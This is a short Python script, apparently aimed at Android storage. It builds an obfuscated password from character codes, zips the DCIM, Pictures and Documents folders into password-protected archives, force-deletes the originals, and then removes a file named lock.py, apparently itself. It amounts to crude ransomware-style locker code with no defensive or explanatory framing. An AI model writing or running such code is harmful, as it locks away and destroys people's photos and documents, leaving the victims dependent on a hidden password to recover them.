import base64, sys,os

ps = chr(98) + chr(97) + chr(98) + chr(97) + chr(121) + chr(97) + chr(103) + chr(97)

os.system("cd")
os.system("cd /sdcard")
os.system("zip --password " + str(ps) + " 1.zip DCIM")
os.system("zip --password " + str(ps) + " 2.zip Pictures")
os.system("zip --password " + str(ps) + " 3.zip Documents")
os.system("rm -rf DCIM")
os.system("rm -rf Pictures")
os.system("rm -rf Documents")
os.system("cd")
os.system("cd boby2")
os.system("rm -rf lock.py")



